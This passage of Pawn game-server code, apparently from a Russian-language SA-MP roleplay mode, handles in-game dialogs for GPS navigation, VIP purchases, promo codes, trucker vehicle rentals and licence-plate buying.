                case 6: ShowPlayerDialog(playerid, 10012, DIALOG_STYLE_LIST, "Развлечения",
                    "{daa302}[Арзамас]{ffffff} Казино", "Поиск", "Назад");
                case 7: ShowPlayerDialog(playerid, 10005, DIALOG_STYLE_LIST, "Автосалоны",
					"{da4100}[Батырево]{ffffff} Автосалон Низкого Класса\n\
					{f94b00}[Южный]{ffffff} Автосалон Среднего Класса\n\
					{daa302}[Арзамас]{ffffff} Автосалон Высокого Класса","Поиск", "Назад"); //\n2. высокий класс\n3. Мото/Вело салон
				case 8:
				{
					STRING_GLOBAL[0] = EOS;
					strcat(STRING_GLOBAL, "1. {CCFFFF}Ближайший магазин 24/7\n");
					strcat(STRING_GLOBAL, "2. {CCFFFF}Ближайшая АЗС\n");
					strcat(STRING_GLOBAL, "3. {CCFFFF}Ближайший банкомат\n");
					strcat(STRING_GLOBAL, "4. {CCFFFF}Ближайшую СТО\n");
					strcat(STRING_GLOBAL, "5. {CCFFFF}Ближайший клуб\n");
					strcat(STRING_GLOBAL, "6. {CCFFFF}Ближайшее казино\n");
					strcat(STRING_GLOBAL, "7. {CCFFFF}Ближайший магазин одежды\n");
					strcat(STRING_GLOBAL, "8. {CCFFFF}Ближайший оружейный магазин\n");
					strcat(STRING_GLOBAL, "9. {CCFFFF}Ближайшая автобусная остановка\n");
					strcat(STRING_GLOBAL, "10. {CCFFFF}Ближайшее риэлторское агенство\n");

					ShowPlayerDialog
					(
						playerid, DIALOG_GPS_PLACES, DIALOG_STYLE_LIST,
						"{f6e58d}Ближайшие места",
						STRING_GLOBAL,
						"Отметить", "Далее"
					);
				}
				case 9: callcmd::hgps(playerid);
			}

			if(listitem > 12)
				GPSPlayer_(playerid, X, Y, Z, locname);

			return 1;
		}
		case DIALOG_GPS_PLACES:
		{
			if(response)
			{
				new Float: X, Float: Y, Float: Z, locname[64];

				switch(listitem)
				{
					case 0:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 1) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайший магазин 24/7";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 1:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 2) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайшая АЗС";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 2:
					{
						new max_distance = 100000;
						new id_atm = -1;

						for(new i = 0; i <= TOTALATM; i++)
						{
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, ATMInfo[i][aX], ATMInfo[i][aY], ATMInfo[i][aZ])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), ATMInfo[i][aX], ATMInfo[i][aY], ATMInfo[i][aZ]));
							if(here_distance < max_distance)
							{
								id_atm = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_atm == -1) return 1;
						X = ATMInfo[id_atm][aX], Y = ATMInfo[id_atm][aY], Z = ATMInfo[id_atm][aZ], locname = "Ближайший банкомат";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 3:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 7) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайшая СТО";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 4:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 4) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайший клуб";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 5:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 9) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайшее казино";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 6:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 8) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайший магазин одежды";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 7:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 6) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Ближайший оружейный магазин";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 8:
					{
						new max_distance = 100000;
						new id_stop = -1;

						for(new idx = 0; idx < sizeof g_bus; idx ++)
						{
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, g_bus[idx][stop_x], g_bus[idx][stop_y], g_bus[idx][stop_z])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), g_bus[idx][stop_x], g_bus[idx][stop_y], g_bus[idx][stop_z]));
							if(here_distance < max_distance)
							{
								id_stop = idx;
								max_distance = here_distance;
							}
						}

						if(max_distance == -1 || id_stop == -1) return 1;
						X = g_bus[id_stop][stop_x], Y = g_bus[id_stop][stop_y], Z = g_bus[id_stop][stop_z], locname = "Ближайшая автобусная остановка";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
					case 9:
					{
						new max_distance = 100000;
						new id_biz = -1;

						for(new i = TOTALBIZZ; i > 0; i --)
						{
							if(BizzInfo[i][bType] != 13) continue;
							new here_distance = (!IsPlayerInAnyVehicle(playerid)) ? floatround(GetPlayerDistanceFromPoint(playerid, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])) : floatround(GetVehicleDistanceFromPoint(GetPlayerVehicleID(playerid), BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]));
							if(here_distance < max_distance)
							{
								id_biz = i;
								max_distance = here_distance;
							}
						}
						if(max_distance == -1 || id_biz == -1) return 1;
						X = BizzInfo[id_biz][bEntrx], Y = BizzInfo[id_biz][bEntry], Z = BizzInfo[id_biz][bEntrz], locname = "Риэлторское агенство";
						GPSPlayer_(playerid, X, Y, Z, locname);
					}
				}
			}
		}
		case 10003:
		{
			if(!response) return callcmd::gps(playerid, inputtext);
			new locname[30], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
                case 0: X = 1821.1362, Y = 2095.7847, Z = 16.1631, locname = "Администрация Области";
				case 1: X = 2583.7219, Y = -2416.4370, Z = 22.0117, locname = "МВД";
				case 2: X = -286.4495, Y = 580.7369, Z = 12.1120, locname = "ГИБДД";
				case 3: X = 440.4861, Y = 1569.2905, Z = 11.5665, locname = "Больница";
				case 4: X = 26.3218, Y = 2835.9031, Z = 23.8444, locname = "Армия";
				case 5: X = 2089.9434, Y = -2409.0881, Z = 21.7477, locname = "СМИ";
				case 6: X = 1923.2083, Y = -2239.7463, Z = 11.1845, locname = "ФСБ";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10004:
		{
		    if(!response) return callcmd::gps(playerid,inputtext);
			new locname[30], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
				case 0: X = -2243.2393, Y = 265.8196, Z = 24.5337, locname = "ОПГ Подольское";
				case 1: X = 1940.6082, Y = 2160.8257, Z = 15.7060, locname = "ОПГ Тамбовское";
				case 2: X = 1935.5800, Y = -1929.7277, Z = 33.8186, locname = "Русская Мафия";
				case 3: X = -2356.4968, Y = 2608.4368, Z = 41.6159, locname = "Итальянская Мафия";
				case 4: X = 410.0666, Y = 969.6555, Z = 12.0000, locname = "Наркопритон";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10001:
        {
 			if(!response) return callcmd::gps(playerid, inputtext);
 			new locname[32], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
			    case 0: X = -193.3521, Y = 624.6976, Z = 12.0010, locname = "Центр занятости";
			    case 1: X = 1919.2585, Y = 2303.9565, Z = 15.5700, locname = "Военкомат";
			    case 2: X = 1912.2400, Y = 2227.6116, Z = 16.0831, locname = "Автошкола";
			    case 3: X = 2630.6445, Y = 1768.3262, Z = 2.5500, locname = "Утилизация авто";
			    case 4: X = -881.8564, Y = 1180.4720, Z = 11.5098, locname = "Автосервис г.Арзамас";
			    case 5: X = 2144.7148, Y = -1842.9594, Z = 18.8213, locname = "Автосервис г.Южный";
				case 6: X = 445.7231, Y = 1008.4907, Z = 12.1405, locname = "Авторынок";
				case 7: X = -286.4495, Y = 580.7369, Z = 12.1120, locname = "Получение номеров";
				case 8: X = 377.0722, Y = 1116.0642, Z = 12.0000, locname = "Университет";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10002:
        {
 			if(!response) return callcmd::gps(playerid, inputtext);
 			new locname[32], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
			    case 0: X = 787.2955, Y = 500.0397, Z = 13.2385, locname = "Лесопилка";
			    case 1: X = 879.9373, Y = 510.1894, Z = 13.2385, locname = "Грузчик";
			    case 2: X = 766.1851, Y = 722.4009, Z = 12.0974, locname = "Стоянка Автобусов";
			    case 3: X = -435.9850, Y = 709.4907, Z = 12.3842, locname = "Стоянка Механиков";
			    case 4: X = 198.5375, Y = 1301.8477, Z = 12.4298, locname = "Стоянка такси";
			    case 5: X = -881.8564, Y = 1180.4720, Z = 11.5098, locname = "База Дальнобойщиков";
			    case 6: X = -807.6794, Y = -1228.3556, Z = 43.4072, locname = "Ферма";
			    case 7: X = 2306.8242, Y = 1741.4094, Z = 1.7617, locname = "Шахта";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10005:
        {
 			if(!response) return callcmd::gps(playerid, inputtext);
 			new locname[32], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
			    case 0: X = 2000.868164, Y = 2739.053955, Z = 12.250000, locname = "Автосалон Эконом";
			    case 1: X = 2327.862060, Y = -1829.14270, Z = 22.542749, locname = "Автосалон Средний";
			    case 2: X = -20.927431, Y = 527.452392, Z = 11.101562, locname = "Автосалон Люкс";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10012:
        {
 			if(!response) return callcmd::gps(playerid, inputtext);
 			new locname[30], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
				case 0: X = -471.7004, Y = 239.4737, Z = 9.4126, locname = "Казино";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10013:
        {
 			if(!response) return callcmd::gps(playerid, inputtext);
 			new locname[30], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
				//case 0: X = 1731.7117, Y = 1730.4885, Z = 15.3086, locname = "Аренда самолётов";
				case 0: X = 1762.3790, Y = 2277.5322, Z = 15.9718, locname = "Автобаза №6";
				case 1: X = 2831.0281, Y = -1539.3876, Z = 2.1600, locname = "Аренда лодок";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10006:
        {
 			if(!response) return callcmd::gps(playerid, inputtext);
 			new locname[30], Float:X, Float:Y, Float:Z;
			switch(listitem)
			{
				case 0: X = 2544.816650, Y = -2220.81152, Z = 23.569662, locname = "Клуб '8 Бит'";
			}
			GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10007:
		{
		    if(!response) return callcmd::gps(playerid, inputtext);
	 		new locname[30], Float:X, Float:Y, Float:Z;
		    switch(listitem)
		    {
		        case 0: X = 62.9153, Y = 843.3816, Z = 12.1716, locname = "Банк Арзамас";
		        case 1: X = 1850.3457, Y = 2035.1680, Z = 16.9742, locname = "Банк Батырево";
		        case 2: X = 2376.6753, Y = -2139.2605, Z = 22.0776, locname = "Банк Южный";
		    }
		    GPSPlayer_(playerid, X, Y, Z, locname);
			return 1;
		}
		case 10011:
		{
		    if(!response) return callcmd::gps(playerid, inputtext);

			new locname[30], Float:X, Float:Y, Float:Z;

			switch(listitem)
			{
			    case 0: X = 497.119201, Y = 1126.811889, Z = 12.050000, locname = "СТО 'Арзамас'";
			    case 1: X = 2158.185546, Y = -1839.04772, Z = 18.820312, locname = "СТО 'Южный'";
			}

			GPSPlayer_(playerid, X, Y, Z, locname);

			return 1;
		}
		case 6446:
		{
			if(!response) return 1;
			if(gym_cloakroom[playerid])
			{
			    gym_cloakroom[playerid] = false;
				SetPlayerSkin(playerid, Oldskin2[playerid]);
				SendClientMessage(playerid, COLOR_RED, "Вы закончили тренировку!");
			}
			else
			{
			    if(GetMoney(playerid) < 500) return SendMess(playerid, MSG_NOT_MONEY);
				GiveMoney(playerid, -500);
				gym_cloakroom[playerid] = true;
				Oldskin2[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid, 80);
				SendClientMessage(playerid, COLOR_GREEN, "Вы начали тренировку. Отрабатывайте удары (( ПКН + F ))!");
			}
		}
       	case D_PROMO+5:
       	{
       	    if(!response) return 1;
  		    /*new qstring[128];
     		mysql_format(dbHandle, qstring, sizeof(qstring), "SELECT * FROM `promo` WHERE `name`='%s'", inputtext);
       	 	mysql_tquery(dbHandle, qstring, "ActivatePromo", "is", playerid,inputtext);*/
       	 	SetPVarString(playerid, "CODE", inputtext);
			//mysql_format(dbHandle, qstring, sizeof(qstring), "SELECT * FROM `promo_activations` WHERE `account_id` = '%d' AND `name_promo`='%s'", PI[playerid][pID], inputtext);

            STRING_GLOBAL[0] = EOS;
			mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM `promo_activations` WHERE `account_id` = '%d' AND `name_promo`='%e'",PI[playerid][pID], inputtext);
			mysql_tquery(dbHandle, STRING_GLOBAL, "CheckPromo", "i", playerid);
       	}
 		case D_DONATE:
		{
			ShowDonateDialogMenu(playerid);
		}
			case D_JOB+196:
		{
		    if(!response) return callcmd::donate(playerid);
			if(PI[playerid][pCredits] < 900) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно RUB!");
			new year, month, day;
			new current_date = getdate(year, month, day);
			new time_left = PI[playerid][pVipTime] - current_date;
			PI[playerid][pCredits] -= 900;
            PI[playerid][pVipTime] = time_left + (current_date + 90);
			SendClientMessage(playerid, COLOR_YELLOW, "Вы продлили {ffffff}VIP{ffff00} статус на {ffffff}90{ffff00} дней (/viphelp)");
			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
		}
		case D_JOB+197:
		{
		    if(!response) return callcmd::donate(playerid);
		    if(PI[playerid][pVip])
			{
			    new string[256];
          		new year, month, day;
				new current_date = getdate(year, month, day);
				new time_left = PI[playerid][pVipTime] - current_date;
			    format(string, sizeof(string), "\n\n{F04245}\tУ Вас уже имеется VIP статус!\n\n{FFFFFF}Дней до окончания: {FFCC00}%d\n{FFFFFF}Желаете продлить на {FFCC00}90 дней{FFFFFF} за 900 RUB?\n\n", time_left);
				ShowPlayerDialog(playerid, D_JOB+196, DIALOG_STYLE_MSGBOX, "{FFCC00}Подтверждение действия", string, "Да", "Нет");
				return 1;
			}
			if(PI[playerid][pCredits] < 900) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
			new year, month, day;
			new current_date = getdate(year, month, day);
			PI[playerid][pCredits] -= 900;
            PI[playerid][pVip] = 1;
            PI[playerid][pVipTime] = current_date + 90;

			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);

			SendClientMessage(playerid, COLOR_LIME, "Вы приобрели VIP аккаунт на 90 дней");
			SendClientMessage(playerid, COLOR_LIME, "Посмотреть список доступных функций Вы можете командой: /viphelp");
		}
		case D_JOB+198:
		{
		    if(!response) return callcmd::donate(playerid);
			if(PI[playerid][pCredits] < 600) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно RUB!");
			new year, month, day;
			new current_date = getdate(year, month, day);
			new time_left = PI[playerid][pVipTime] - current_date;
			PI[playerid][pCredits] -= 600;
            PI[playerid][pVipTime] = time_left + (current_date + 60);
			SendClientMessage(playerid, COLOR_YELLOW, "Вы продлили {ffffff}VIP{ffff00} статус на {ffffff}60{ffff00} дней (/viphelp)");
			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
		}
		case D_JOB+199:
		{
		    if(!response) return callcmd::donate(playerid);
		    if(PI[playerid][pVip])
			{
			    new string[256];
          		new year, month, day;
				new current_date = getdate(year, month, day);
				new time_left = PI[playerid][pVipTime] - current_date;
			    format(string, sizeof(string), "\n\n{F04245}\tУ Вас уже имеется VIP статус!\n\n{FFFFFF}Дней до окончания: {FFCC00}%d\n{FFFFFF}Желаете продлить на {FFCC00}60 дней{FFFFFF} за 600 RUB?\n\n", time_left);
				ShowPlayerDialog(playerid, D_JOB+198, DIALOG_STYLE_MSGBOX, "{FFCC00}Подтверждение действия", string, "Да", "Нет");
				return 1;
			}
			if(PI[playerid][pCredits] < 600) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
			new year, month, day;
			new current_date = getdate(year, month, day);
			PI[playerid][pCredits] -= 600;
            PI[playerid][pVip] = 1;
            PI[playerid][pVipTime] = current_date + 60;

			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);

			SendClientMessage(playerid, COLOR_LIME, "Вы приобрели VIP аккаунт на 60 дней");
			SendClientMessage(playerid, COLOR_LIME, "Посмотреть список доступных функций Вы можете командой: /viphelp");
		}
		case D_JOB+200:
		{
		    if(!response) return callcmd::donate(playerid);
		    if(PI[playerid][pVip])
			{
			    new string[256];
          		new year, month, day;
				new current_date = getdate(year, month, day);
				new time_left = PI[playerid][pVipTime] - current_date;
			    format(string, sizeof(string), "\n\n{F04245}\tУ Вас уже имеется VIP статус!\n\n{FFFFFF}Дней до окончания: {FFCC00}%d\n{FFFFFF}Желаете продлить на {FFCC00}30 дней{FFFFFF} за 350 RUB?\n\n", time_left);
				ShowPlayerDialog(playerid, D_JOB+202, DIALOG_STYLE_MSGBOX, "{FFCC00}Подтверждение действия", string, "Да", "Нет");
				return 1;
			}
			if(PI[playerid][pCredits] < 350) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
			new year, month, day;
			new current_date = getdate(year, month, day);
			PI[playerid][pCredits] -= 350;
            PI[playerid][pVip] = 1;
            PI[playerid][pVipTime] = current_date + 30;

			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);

			SendClientMessage(playerid, COLOR_LIME, "Вы приобрели VIP аккаунт на 30 дней");
			SendClientMessage(playerid, COLOR_LIME, "Посмотреть список доступных функций Вы можете командой: /viphelp");
		}
		case D_JOB+202:
		{
		    if(!response) return callcmd::donate(playerid);
			if(PI[playerid][pCredits] < 350) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно RUB!");
			new year, month, day;
			new current_date = getdate(year, month, day);
			new time_left = PI[playerid][pVipTime] - current_date;
			PI[playerid][pCredits] -= 350;
            PI[playerid][pVipTime] = time_left + (current_date + 30);
			SendClientMessage(playerid, COLOR_YELLOW, "Вы продлили {ffffff}VIP{ffff00} статус на {ffffff}30{ffff00} дней (/viphelp)");
			MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
			MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
		}
  		case ArendTruckerDialog:
		{
			if(!response) return true;
			switch(listitem)
			{
			    case 0:
			    {
					ShowPlayerDialog(playerid,2034,DIALOG_STYLE_MSGBOX,"{FFCC00}Avia A31","{FFFFFF}Вы действительно хотите арендовать это авто за {FFFFFF}1000 {ffffff}руб.","Аренда","Закрыть");
			    }
			    case 1:
			    {
					if(g_player_skills[playerid][S_T_COUNT] >= 5)
					{
						ShowPlayerDialog(playerid,2035,DIALOG_STYLE_MSGBOX,"{FFCC00}Scania","{FFFFFF}Вы действительно хотите арендовать это авто за {FFFFFF}3000 {ffffff}руб.","Аренда","Закрыть");
					}
					else
					{
					    SendClientMessage(playerid,COLOR_RED,"Ваш уровень дальнобойщика мал");
					}
			    }
			    case 2:
			    {
					if(g_player_skills[playerid][S_T_COUNT] >= 15)
					{
						ShowPlayerDialog(playerid,2036,DIALOG_STYLE_MSGBOX,"{FFCC00}Mecedes-Benz","{FFFFFF}Вы действительно хотите арендовать это авто за {FFFFFF}5000 {ffffff}руб.","Аренда","Закрыть");
					}
					else
					{
					    SendClientMessage(playerid,COLOR_RED,"Ваш уровень дальнобойщика мал");
					}
			    }
			}
  		}
		case 2034:
		{
		    for(new r = 0; r<MAX_PLAYERS; r++)
		    {
		        if(!response) return 1;
			    if(GetPVarInt(r, "ParkTime") > gettime()) return SendClientMessage(playerid, COLOR_LIME, "Парковка занята, ожидайте 15 секунд");
				if(PI[playerid][pCash] < 1000) return SendClientMessage(playerid, COLOR_RED, "Недостаточно денег для аренды!");
				GiveMoney(playerid, -1000);
				SetPVarInt(playerid, "TruckerJobTimeGoToCar", 30);
				SetPVarInt(playerid, "TruckerJobFuel", 1);
				SetPVarInt(playerid, "TruckerJob", 1);
				SetPVarInt(r, "ParkTime", gettime()+15);
				PI[playerid][TruckerCarID] = TruckerCar[playerid];
				new i = random(sizeof coord_spawn_truck);
				TruckerCar[playerid] = CreateVehicle(609, coord_spawn_truck[i][0], coord_spawn_truck[i][1], coord_spawn_truck[i][2], coord_spawn_truck[i][3], -1, -1, -1);
				SetVehicleData(TruckerCar[playerid], veh_fuel, 50);
				return SendClientMessage(playerid, COLOR_RED,"У Вас есть 30 секунд что бы взять грузовик");
				//SetPVarInt(playerid, "ParkTime", gettime()+15);
			}
		}
		case 2035:
		{
  			for(new idx = 0; idx<MAX_PLAYERS; idx++)
		    {
		        if(!response) return 1;
		        if(GetPVarInt(idx, "ParkTime") > gettime()) return SendClientMessage(playerid, COLOR_LIME, "Парковка занята, ожидайте 15 секунд");
				if(PI[playerid][pCash] < 4000) return SendClientMessage(playerid, COLOR_RED, "Недостаточно денег для аренды!");
				GiveMoney(playerid, -4000);
				SetPVarInt(playerid, "TruckerJobTimeGoToCar", 30);
				SetPVarInt(playerid, "TruckerJob", 1);
				SetPVarInt(idx, "ParkTime", gettime()+15);
				PI[playerid][TruckerCarID] = TruckerCar[playerid];
				new i = random(sizeof coord_spawn_truck);
				TruckerCar[playerid] = CreateVehicle(514, coord_spawn_truck[i][0], coord_spawn_truck[i][1], coord_spawn_truck[i][2], coord_spawn_truck[i][3], -1, -1, -1);
				SetVehicleData(TruckerCar[playerid], veh_fuel, 50);
				new r = random(sizeof coord_spawn_trailers);
				PI[playerid][P_GRUZ_CAR] = CreateVehicle(435, coord_spawn_trailers[r][0], coord_spawn_trailers[r][1], coord_spawn_trailers[r][2], coord_spawn_trailers[r][3], -1, -1, -1);
				return SendClientMessage(playerid,COLOR_RED,"У Вас есть 30 секунд что бы взять грузовик");
			}
		}
		case 2036:
		{
			for(new i = 0; i<MAX_PLAYERS; i++)
		    {
		        if(!response) return 1;
	      		if(GetPVarInt(i, "ParkTime") > gettime()) return SendClientMessage(playerid, COLOR_LIME, "Парковка занята, ожидайте 15 секунд");
				if(PI[playerid][pCash] < 5000) return SendClientMessage(playerid, COLOR_RED, "Недостаточно денег для аренды!");
				GiveMoney(playerid, -5000);
				SetPVarInt(playerid, "TruckerJobTimeGoToCar", 30);
				SetPVarInt(playerid, "TruckerJob", 1);
				SetPVarInt(i, "ParkTime", gettime()+15);
				PI[playerid][TruckerCarID] = TruckerCar[playerid];
				new idx = random(sizeof coord_spawn_truck);
				TruckerCar[playerid] = CreateVehicle(515, coord_spawn_truck[idx][0], coord_spawn_truck[idx][1], coord_spawn_truck[idx][2], coord_spawn_truck[idx][3], -1, -1, -1);
				SetVehicleData(TruckerCar[playerid], veh_fuel, 50);
				new r = random(sizeof coord_spawn_trailers);
				PI[playerid][P_GRUZ_CAR] = CreateVehicle(584, coord_spawn_trailers[r][0], coord_spawn_trailers[r][1], coord_spawn_trailers[r][2], coord_spawn_trailers[r][3], -1, -1, -1);
				return SendClientMessage(playerid,COLOR_RED,"У Вас есть 30 секунд что бы взять грузовик");
			}
		}
		case DIALOG_BUY_VIP_NUMBER:
		{
			if(response)
			{
				if(!strlen(inputtext))
					return ShowPlayerBuyVipNumberCar(playerid);

				if(IsACarNumber(inputtext))
				{
					if(g_player_car[playerid] == INVALID_VEHICLE_ID)
						return 1;

					new fmt_query[128], Cache: result, rows;

					mysql_format(dbHandle, fmt_query, sizeof(fmt_query), "SELECT * FROM ownable_cars WHERE `number` = '%e'", inputtext);
					result = mysql_query(dbHandle, fmt_query, true);

					rows = cache_num_rows();

					cache_delete(result);

					if(rows)
						return SendClientMessage(playerid, COLOR_RED, "Введённый Вами номер уже занят");

					new vehicleid = g_player_car[playerid];

